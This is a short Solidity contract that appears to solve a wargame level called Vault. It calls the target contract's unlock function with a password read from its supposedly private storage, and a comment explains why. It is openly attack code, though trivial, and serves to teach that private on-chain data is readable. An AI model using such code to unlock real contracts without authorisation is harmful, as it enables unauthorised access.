pragma solidity ^0.4.18;

import "./levels/Vault.sol";

contract VaultHack {
    // malicious attacker must pass in password because contracts
    // cannot read storage of other contracts and victim contract's 
    // state variable "bytes32 private password;" does not have a getter
    function attack(address _target, bytes32 _password) public {
        Vault(_target).unlock(_password);
    }
}